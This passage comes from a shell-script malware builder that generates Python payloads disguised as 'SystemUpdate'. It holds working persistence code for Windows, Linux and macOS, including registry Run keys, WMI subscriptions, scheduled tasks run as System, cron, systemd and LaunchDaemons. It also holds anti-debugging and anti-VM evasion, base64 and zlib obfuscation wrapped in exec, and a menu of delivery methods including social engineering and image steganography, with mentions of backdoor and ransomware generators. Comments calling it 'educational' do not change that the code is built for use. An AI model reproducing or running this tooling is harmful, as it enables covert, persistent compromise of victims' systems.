            startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder)
            startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
            if not os.path.exists(startup_exe):
                import shutil
                shutil.copy2(exe_path, startup_exe)
                
        elif PERSISTENCE_METHOD == "wmi_subscription":
            # Create WMI event subscription
            wmi_script = f'''
\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
    Name = "SystemUpdateFilter"
    EventName = "SystemUpdateFilter"
}}

\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = "SystemUpdateConsumer"
    CommandLineTemplate = "{exe_path}"
}}

\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = \$filter
    Consumer = \$consumer
}}
'''
            # Execute PowerShell script
            subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
            
        elif PERSISTENCE_METHOD == "scheduled_task":
            # Create scheduled task
            task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
            subprocess.run(task_cmd, shell=True, check=False)
            
        elif PERSISTENCE_METHOD == "lnk_file":
            # Create LNK file on desktop
            import pythoncom
            from win32com.shell import shell, shellcon
            
            desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
            shortcut_path = os.path.join(desktop, "System Update.lnk")
            
            if not os.path.exists(shortcut_path):
                shortcut = pythoncom.CoCreateInstance(
                    shell.CLSID_ShellLink, None,
                    pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
                )
                shortcut.SetPath(exe_path)
                shortcut.SetDescription("System Update")
                shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
                
                persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
                persist_file.Save(shortcut_path, 0)
            
        elif PERSISTENCE_METHOD == "shell_extension":
            # Add to right-click context menu
            reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
                
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
            
    except Exception as e:
        # Silently handle errors in educational context
        pass

def setup_persistence_linux():
    """Set up persistence on Linux"""
    if not AUTO_EXECUTION:
        return
    
    try:
        # Get current executable path
        exe_path = os.path.abspath(sys.argv[0])
        
        # Linux persistence based on selected method
        if PERSISTENCE_METHOD == "cron":
            # Add to crontab
            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
            with open("/tmp/crontab.txt", "w") as f:
                f.write(cron_job)
            
            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
            os.remove("/tmp/crontab.txt")
            
        elif PERSISTENCE_METHOD == "linux_systemd":
            # Create systemd service
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={exe_path}
Restart=on-failure
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
            
            service_path = "/lib/systemd/system/system-update.service"
            with open(service_path, "w") as f:
                f.write(service_content)
                
            subprocess.run("systemctl enable system-update.service", shell=True, check=False)
            
        elif PERSISTENCE_METHOD == "init_script":
            # Create init.d script
            init_script = f"""#!/bin/bash
# System Update Service
# chkconfig: 35 80 20
# description: System Update Service

. /etc/rc.d/init.d/functions

USER=root
DAEMON="{exe_path}"
ROOT_DIR=\$(dirname \$DAEMON)
PIDFILE=/var/run/system-update.pid

start() {{
    echo -n "Starting SystemUpdate: "
    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
    return \$RETVAL
}}

stop() {{
    echo -n "Stopping SystemUpdate: "
    killproc -p "\$PIDFILE" "\$DAEMON"
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
    return \$RETVAL
}}

case "\$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    restart)
        stop
        start
        ;;
    status)
        status -p "\$PIDFILE" "\$DAEMON"
        ;;
    *)
        echo "Usage: {{start|stop|restart|status}}"
        exit 1
esac

exit \$RETVAL
"""
            
            init_path = "/etc/init.d/system-update"
            with open(init_path, "w") as f:
                f.write(init_script)
                
            os.chmod(init_path, 0o755)
            subprocess.run("chkconfig --add system-update", shell=True, check=False)
            
        elif PERSISTENCE_METHOD == "profile_mod":
            # Add to profile
            profile_path = "/etc/profile.d/system-update.sh"
            with open(profile_path, "w") as f:
                f.write(f"#!/bin/bash\n{exe_path} &\n")
            os.chmod(profile_path, 0o755)
            
        elif PERSISTENCE_METHOD == "desktop_shortcut":
            # Create .desktop file
            desktop_dir = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(desktop_dir):
                os.makedirs(desktop_dir)
                
            desktop_file = os.path.join(desktop_dir, "system-update.desktop")
            if not os.path.exists(desktop_file):
                with open(desktop_file, "w") as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=System Update
Exec={exe_path}
Icon=system-software-update
Terminal=false
Categories=System;
""")
                os.chmod(desktop_file, 0o755)
            
    except Exception as e:
        # Silently handle errors in educational context
        pass

def setup_persistence_macos():
    """Set up persistence on macOS"""
    if not AUTO_EXECUTION:
        return
    
    try:
        # Get current executable path
        exe_path = os.path.abspath(sys.argv[0])
        
        # macOS persistence based on selected method
        if PERSISTENCE_METHOD == "macos_launchagent":
            # Create LaunchAgent
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            
            plist_path = "/Library/LaunchAgents/com.system.update.plist"
            with open(plist_path, "w") as f:
                f.write(plist_content)
                
            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
            
        elif PERSISTENCE_METHOD == "macos_launchdaemon":
            # Create LaunchDaemon
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            
            plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
            with open(plist_path, "w") as f:
                f.write(plist_content)
                
            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
            
        elif PERSISTENCE_METHOD == "login_item":
            # Add to login items
            script = f'''
tell application "System Events"
    make login item at end with properties {{path:"{exe_path}", hidden:false}}
end tell
'''
            subprocess.run(["osascript", "-e", script], check=False)
            
        elif PERSISTENCE_METHOD == "cron":
            # Add to crontab
            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
            with open("/tmp/crontab.txt", "w") as f:
                f.write(cron_job)
            
            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
            os.remove("/tmp/crontab.txt")
            
        elif PERSISTENCE_METHOD == "dock_shortcut":
            # Add to Dock
            dock_script = f'''
tell application "System Events"
    tell dock preferences
        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
    end tell
end tell
'''
            subprocess.run(["osascript", "-e", dock_script], check=False)
        
    except Exception as e:
        # Silently handle errors in educational context
        pass

def setup_persistence():
    """Set up persistence mechanisms based on the detected OS"""
    detected_os = detect_os()
    
    if detected_os == "Windows":
        setup_persistence_windows()
    elif detected_os == "Linux":
        setup_persistence_linux()
    elif detected_os == "macOS":
        setup_persistence_macos()
    else:
        # Unknown OS, skip persistence
        pass

def execute_payload_windows():
    """Execute Windows-specific payload code"""
    # Simulate Windows-specific payload action
    time.sleep(2)

def execute_payload_linux():
    """Execute Linux-specific payload code"""
    # Simulate Linux-specific payload action
    time.sleep(2)

def execute_payload_macos():
    """Execute macOS-specific payload code"""
    # Simulate macOS-specific payload action
    time.sleep(2)

def execute_payload():
    """Execute the appropriate payload based on the detected OS"""
    detected_os = detect_os()
    
    if detected_os == "Windows":
        execute_payload_windows()
    elif detected_os == "Linux":
        execute_payload_linux()
    elif detected_os == "macOS":
        execute_payload_macos()
    else:
        # Unknown OS, execute generic payload
        time.sleep(2)

def anti_debug_check():
    """Check for debugging environment"""
    if not ANTI_DEBUG_ENABLED:
        return False
        
    try:
        # Check for common debuggers
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
        for debugger in debuggers:
            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
                return True
                
        # Check for debugging flags
        if hasattr(sys, 'gettrace') and sys.gettrace():
            return True
            
        # Timing check
        start = time.time()
        time.sleep(0.1)
        end = time.time()
        if (end - start) > 0.15:
            return True
            
        return False
    except:
        return False

def anti_vm_check():
    """Check for virtualization environment"""
    if not ANTI_VM_ENABLED:
        return False
        
    try:
        vm_indicators = [
            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
        ]
        
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                with open(indicator, 'r') as f:
                    content = f.read().lower()
                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
                        return True
        
        # Check MAC address
        try:
            import uuid
            mac = uuid.getnode()
            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
                return True
        except:
            pass
        
        # Check for common VM processes
        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
        for process in vm_processes:
            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
                return True
        
        return False
    except:
        return False

def main():
    # Anti-analysis checks
    if anti_debug_check() or anti_vm_check():
        # Exit silently if detected
        sys.exit(0)
    
    # First, set up persistence
    setup_persistence()
    
    # Then execute the payload
    if FAKE_GUI:
        # Run payload in background thread
        t = threading.Thread(target=execute_payload)
        t.daemon = True
        t.start()
        
        # Run Fake GUI in foreground
        run_fake_gui()
        
        # Wait for payload to finish (optional, or just let it be daemon)
        t.join()
    else:
        execute_payload()

if __name__ == "__main__":
    main()
EOF
}

# Educational payload templates (keep all existing functions)
create_bricker_payload() {
    local attacker_ip=$1
    local attacker_port=$2
    local encryption_key=$3
    local target_os=${4:-"Unknown"}
    
    cat > payload.py << EOF
#!/usr/bin/env python3
import os
import sys
import time
import platform
import subprocess
import threading
import base64
import tempfile
import shutil

# Auto-execution setup
AUTO_EXECUTION = $AUTO_EXECUTION
FAKE_GUI = $FAKE_GUI_ENABLED
PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"

# Anti-detection
ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
ANTI_VM_ENABLED = $ANTI_VM_ENABLED

# Include Fake GUI logic if enabled
 $(generate_fake_gui_code)

def setup_persistence():
    """Set up persistence mechanisms based on the target OS"""
    if not AUTO_EXECUTION:
        return
    
    try:
        system = platform.system()
        
        if system == "Windows":
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Windows persistence based on selected method
            if PERSISTENCE_METHOD == "registry":
                import winreg
                # Add to registry run key
                key = winreg.HKEY_CURRENT_USER
                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
                    
            elif PERSISTENCE_METHOD == "windows_startup":
                # Copy to Windows Startup folder
                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
                if not os.path.exists(startup_folder):
                    os.makedirs(startup_folder)
                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
                if not os.path.exists(startup_exe):
                    import shutil
                    shutil.copy2(exe_path, startup_exe)
                    
            elif PERSISTENCE_METHOD == "wmi_subscription":
                # Create WMI event subscription
                wmi_script = f'''
\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
    Name = "SystemUpdateFilter"
    EventName = "SystemUpdateFilter"
}}

\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = "SystemUpdateConsumer"
    CommandLineTemplate = "{exe_path}"
}}

\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = \$filter
    Consumer = \$consumer
}}
'''
                # Execute PowerShell script
                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
                
            elif PERSISTENCE_METHOD == "scheduled_task":
                # Create scheduled task
                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                subprocess.run(task_cmd, shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "lnk_file":
                # Create LNK file on desktop
                import pythoncom
                from win32com.shell import shell, shellcon
                
                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
                shortcut_path = os.path.join(desktop, "System Update.lnk")
                
                if not os.path.exists(shortcut_path):
                    shortcut = pythoncom.CoCreateInstance(
                        shell.CLSID_ShellLink, None,
                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
                    )
                    shortcut.SetPath(exe_path)
                    shortcut.SetDescription("System Update")
                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
                    
                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
                    persist_file.Save(shortcut_path, 0)
            
            elif PERSISTENCE_METHOD == "shell_extension":
                # Add to right-click context menu
                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
                    
                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                
        elif system == "Linux":
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Linux persistence based on selected method
            if PERSISTENCE_METHOD == "cron":
                # Add to crontab
                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
                with open("/tmp/crontab.txt", "w") as f:
                    f.write(cron_job)
                
                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                os.remove("/tmp/crontab.txt")
                
            elif PERSISTENCE_METHOD == "linux_systemd":
                # Create systemd service
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={exe_path}
Restart=on-failure
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
                
                service_path = "/lib/systemd/system/system-update.service"
                with open(service_path, "w") as f:
                    f.write(service_content)
                    
                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "init_script":
                # Create init.d script
                init_script = f"""#!/bin/bash
# System Update Service
# chkconfig: 35 80 20
# description: System Update Service

. /etc/rc.d/init.d/functions

USER=root
DAEMON="{exe_path}"
ROOT_DIR=$(dirname \$DAEMON)
PIDFILE=/var/run/system-update.pid

start() {{
    echo -n "Starting SystemUpdate: "
    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
    return \$RETVAL
}}

stop() {{
    echo -n "Stopping SystemUpdate: "
    killproc -p "\$PIDFILE" "\$DAEMON"
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
    return \$RETVAL
}}

case "\$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    restart)
        stop
        start
        ;;
    status)
        status -p "\$PIDFILE" "\$DAEMON"
        ;;
    *)
        echo "Usage: {{start|stop|restart|status}}"
        exit 1
esac

exit \$RETVAL
"""
                
                init_path = "/etc/init.d/system-update"
                with open(init_path, "w") as f:
                    f.write(init_script)
                    
                os.chmod(init_path, 0o755)
                subprocess.run("chkconfig --add system-update", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "profile_mod":
                # Add to profile
                profile_path = "/etc/profile.d/system-update.sh"
                with open(profile_path, "w") as f:
                    f.write(f"#!/bin/bash\n{exe_path} &\n")
                os.chmod(profile_path, 0o755)
                
            elif PERSISTENCE_METHOD == "desktop_shortcut":
                # Create .desktop file
                desktop_dir = os.path.expanduser("~/.config/autostart")
                if not os.path.exists(desktop_dir):
                    os.makedirs(desktop_dir)
                    
                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
                if not os.path.exists(desktop_file):
                    with open(desktop_file, "w") as f:
                        f.write(f"""[Desktop Entry]
Type=Application
Name=System Update
Exec={exe_path}
Icon=system-software-update
Terminal=false
Categories=System;
""")
                    os.chmod(desktop_file, 0o755)
                
        elif system == "Darwin":  # macOS
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # macOS persistence based on selected method
            if PERSISTENCE_METHOD == "macos_launchagent":
                # Create LaunchAgent
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
                
                plist_path = "/Library/LaunchAgents/com.system.update.plist"
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                    
                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "macos_launchdaemon":
                # Create LaunchDaemon
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
                
                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                    
                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "login_item":
                # Add to login items
                script = f'''
tell application "System Events"
    make login item at end with properties {{path:"{exe_path}", hidden:false}}
end tell
'''
                subprocess.run(["osascript", "-e", script], check=False)
                
            elif PERSISTENCE_METHOD == "cron":
                # Add to crontab
                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
                with open("/tmp/crontab.txt", "w") as f:
                    f.write(cron_job)
                
                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                os.remove("/tmp/crontab.txt")
                
            elif PERSISTENCE_METHOD == "dock_shortcut":
                # Add to Dock
                dock_script = f'''
tell application "System Events"
    tell dock preferences
        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
    end tell
end tell
'''
                subprocess.run(["osascript", "-e", dock_script], check=False)
            
    except Exception as e:
        # Silently handle errors in educational context
        pass

def anti_debug_check():
    """Check for debugging environment"""
    if not ANTI_DEBUG_ENABLED:
        return False
        
    try:
        # Check for common debuggers
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
        for debugger in debuggers:
            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
                return True
                
        # Check for debugging flags
        if hasattr(sys, 'gettrace') and sys.gettrace():
            return True
            
        # Timing check
        start = time.time()
        time.sleep(0.1)
        end = time.time()
        if (end - start) > 0.15:
            return True
            
        return False
    except:
        return False

def anti_vm_check():
    """Check for virtualization environment"""
    if not ANTI_VM_ENABLED:
        return False
        
    try:
        vm_indicators = [
            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
        ]
        
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                with open(indicator, 'r') as f:
                    content = f.read().lower()
                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
                        return True
        
        # Check MAC address
        try:
            import uuid
            mac = uuid.getnode()
            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
                return True
        except:
            pass
        
        # Check for common VM processes
        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
        for process in vm_processes:
            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
                return True
        
        return False
    except:
        return False

def execute_payload():
    setup_persistence()
    # Simulate payload action (silent)
    time.sleep(3)

def main():
    # Anti-analysis checks
    if anti_debug_check() or anti_vm_check():
        # Exit silently if detected
        sys.exit(0)
    
    if FAKE_GUI:
        # Run payload in background thread
        t = threading.Thread(target=execute_payload)
        t.daemon = True
        t.start()
        
        # Run Fake GUI in foreground
        run_fake_gui()
        
        # Wait for payload to finish (optional, or just let it be daemon)
        t.join()
    else:
        execute_payload()

if __name__ == "__main__":
    main()
EOF
}

# Keep all other payload creation functions as they are (create_backdoor_payload, create_ransomware_payload, etc.)

# Obfuscation and anti-analysis (keep existing functions)
apply_obfuscation() {
    local level=$1
    
    echo -e "${Y}[*] Applying obfuscation level $level...${NC}"
    
    case $level in
        1)
            sed -i.bak -e 's/\bdef \([a-zA-Z_][a-zA-Z0-9_]*\)/def _\1/g' \
                      -e 's/\bclass \([a-zA-Z_][a-zA-Z0-9_]*\)/class _\1/g' \
                      payload.py
            ;;
        2)
            sed -i.bak -e 's/\bdef \([a-zA-Z_][a-zA-Z0-9_]*\)/def _\1/g' \
                      -e 's/\bclass \([a-zA-Z_][a-zA-Z0-9_]*\)/class _\1/g' \
                      -e 's/\([a-zA-Z_][a-zA-Z0-9_]*\) =/\1 =/g' \
                      payload.py
            ;;
        3)
            # FIX: Hex Encode
            python3 - << 'PYTHON_SCRIPT'
import re

def hex_encode(match):
    original = match.group(0)
    inner = original[1:-1]
    hex_data = inner.encode('utf-8').hex()
    hex_str = ''.join([f'\\x{hex_data[i:i+2]}' for i in range(0, len(hex_data), 2)])
    return '"' + hex_str + '"'

with open('payload.py', 'r') as f:
    content = f.read()

content = re.sub(r'"([^"]*)"', hex_encode, content)

with open('payload.py', 'w') as f:
    f.write(content)

print("Hex encoding obfuscation applied.")
PYTHON_SCRIPT
            ;;
        4)
            # Professional: Base64 Encode
            python3 - << 'PYTHON_SCRIPT'
import base64

with open('payload.py', 'r') as f:
    content = f.read()

encoded = base64.b64encode(content.encode('utf-8')).decode('utf-8')

new_content = f'''import base64
exec(base64.b64decode("{encoded}"))
'''

with open('payload.py', 'w') as f:
    f.write(new_content)

print("Base64 encoding obfuscation applied.")
PYTHON_SCRIPT
            ;;
        5)
            # Military Grade: Compression + Base64
            python3 - << 'PYTHON_SCRIPT'
import zlib
import base64

with open('payload.py', 'rb') as f:
    content = f.read()

compressed = zlib.compress(content)
encoded = base64.b64encode(compressed).decode('utf-8')

new_content = f'''import zlib, base64
exec(zlib.decompress(base64.b64decode("{encoded}")))
'''

with open('payload.py', 'w') as f:
    f.write(new_content)

print("Compression + Base64 obfuscation applied.")
PYTHON_SCRIPT
            ;;
    esac
    
    log_message "INFO" "Obfuscation level $level applied"
}

apply_anti_debug() {
    echo -e "${Y}[*] Applying anti-debugging techniques...${NC}"
    
    cat >> payload.py << 'EOF'

import sys
import os
import time

def check_debugger():
    try:
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
        for debugger in debuggers:
            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
                # print(f'Debugger detected: {debugger}')
                return True
        return False
    except:
        return False

def check_timing():
    start = time.time()
    time.sleep(0.1)
    end = time.time()
    if (end - start) > 0.15:
        # print('Timing anomaly detected')
        return True
    return False

def check_trace():
    if hasattr(sys, 'gettrace') and sys.gettrace():
        # print('Trace function detected')
        return True
    return False

if check_debugger() or check_timing() or check_trace():
    # print('Debugging environment detected - exiting')
    sys.exit(0)
EOF
    
    log_message "INFO" "Anti-debugging techniques applied"
}

apply_anti_vm() {
    echo -e "${Y}[*] Applying anti-VM techniques...${NC}"
    
    cat >> payload.py << 'EOF'

def check_vm():
    try:
        vm_indicators = [
            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
        ]
        
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                with open(indicator, 'r') as f:
                    content = f.read().lower()
                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
                        # print('Virtualization detected')
                        return True
        
        # Check MAC address
        try:
            import uuid
            mac = uuid.getnode()
            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
                # print('VM MAC address detected')
                return True
        except:
            pass
        
        # Check for common VM processes
        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
        for process in vm_processes:
            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
                # print('VM process detected')
                return True
        
        return False
    except:
        return False

if check_vm():
    # print('Virtual environment detected - exiting')
    sys.exit(0)
EOF
    
    log_message "INFO" "Anti-VM techniques applied"
}

# Enhanced delivery methods
deliver_payload() {
    local payload_path=$1
    local delivery_method=$2
    local delivery_targets=$3
    
    if [ -z "$delivery_method" ]; then
        log_message "INFO" "No delivery method specified, skipping delivery"
        return 0
    fi
    
    log_message "INFO" "Preparing delivery using method: $delivery_method"
    
    case "$delivery_method" in
        "email")
            deliver_via_email "$payload_path" "$delivery_targets"
            ;;
        "usb")
            deliver_via_usb "$payload_path" "$delivery_targets"
            ;;
        "web")
            deliver_via_web "$payload_path" "$delivery_targets"
            ;;
        "network")
            deliver_via_network "$payload_path" "$delivery_targets"
            ;;
        "social_engineering")
            deliver_via_social_engineering "$payload_path" "$delivery_targets"
            ;;
        "bundle")
            deliver_via_bundling "$payload_path" "$delivery_targets"
            ;;
        "cloudflare_tunnel")
            deliver_via_cloudflare_tunnel "$payload_path" "$delivery_targets"
            ;;
        "image_steganography")
            deliver_via_image_steganography "$payload_path" "$delivery_targets"
            ;;
        *)
            log_message "ERROR" "Unknown delivery method: $delivery_method"
            return 1
            ;;
    esac
    
    return $?
}

deliver_via_image_steganography() {
    local payload_path=$1
    local output_image=$2
    
    echo -e "${Y}[*] Preparing image steganography delivery...${NC}"
    
    if [ ! -f "$IMAGE_FILE" ]; then
        log_message "ERROR" "Image file not found: $IMAGE_FILE"
        return 1
    fi
    
    # Create a Python script for steganography
    local stego_script="$TEMP_DIR/steganography.py"
    cat > "$stego_script" << EOF
#!/usr/bin/env python3
import os
import sys
from PIL import Image
import base64
import io

def hide_payload_in_image(image_path, payload_path, output_path):
    try:
        # Open the image
        img = Image.open(image_path)
        
        # Read the payload
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
        
        # Encode the payload as base64
        encoded_payload = base64.b64encode(payload_data).decode('utf-8')
        
        # Add a delimiter to mark the end of the payload
        payload_with_delimiter = encoded_payload + "###END###"
        
        # Convert the image to RGB if it's not
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        # Get image dimensions
        width, height = img.size
        
        # Check if the image is large enough to hide the payload
        max_payload_size = (width * height * 3) // 8  # 1 bit per color channel
        if len(payload_with_delimiter) > max_payload_size:
            print(f"Error: Payload too large for this image. Max size: {max_payload_size} bytes")
            return False
        
        # Convert image to pixel data
        pixels = list(img.getdata())
        
        # Convert payload to binary
        payload_binary = ''.join([format(ord(char), '08b') for char in payload_with_delimiter])
        
        # Hide the payload in the least significant bits of the image pixels
        modified_pixels = []
        payload_index = 0
        
        for i in range(len(pixels)):
            r, g, b = pixels[i]
            
            # Modify the least significant bit of each color channel
            if payload_index < len(payload_binary):
